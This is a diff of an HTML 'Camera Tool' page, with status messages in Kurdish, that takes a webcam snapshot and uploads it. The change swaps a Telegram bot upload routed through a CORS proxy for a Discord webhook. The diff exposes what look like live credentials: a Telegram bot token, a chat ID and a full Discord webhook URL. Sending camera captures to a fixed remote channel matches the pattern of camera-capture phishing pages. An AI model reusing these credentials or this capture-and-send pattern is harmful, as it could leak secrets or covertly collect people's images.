@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Tool</title>
+    <title>Camera Tool - Discord</title>
 </head>
 <body style="background-color: #222; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; padding: 20px;">
 
@@ -27,27 +27,22 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
-              statusEl.innerText = "خەریکی ناردنی وێنەیە بۆ تلگرام...";
+              statusEl.innerText = "خەریکی ناردنی وێنەیە بۆ دیسکۆرد...";
               
               const formData = new FormData();
-              formData.append('chat_id', '6539379136');
-              formData.append('photo', blob, 'snapshot.jpg');
+              formData.append('file', blob, 'snapshot.jpg');
 
-              // پاککردنەوەی خۆکارانەی هەر فەزایەکی شاراوە لە تۆکەنەکەدا
-              const rawToken = "8699050179:AAGeUEWCavf8zBFg8dHxoQb4YU1ofp0T3Cw";
-              const token = rawToken.replace(/\s+/g, '');
-              const targetUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+              const webhookUrl = "https://discord.com/api/webhooks/1530508855312908359/1D20S329-icndZ9T_PwCgds9UkS_ltxOaRK_5pcxr99UWCmSAfCVCzw4Pok2H-MLXFZg";
 
-              fetch('https://corsproxy.io/?' + encodeURIComponent(targetUrl), {
+              fetch(webhookUrl, {
                 method: 'POST',
                 body: formData
               })
-              .then(response => response.json())
-              .then(data => {
-                if(data.ok) {
-                    statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
+              .then(response => {
+                if(response.ok) {
+                    statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ دیسکۆرد!";
                 } else {
-                    statusEl.innerText = "❌ هەڵەی تلگرام: " + (data.description || JSON.stringify(data));
+                    statusEl.innerText = "❌ هەڵە لە ناردن بۆ دیسکۆرد";
                 }
               })
               .catch(error => {
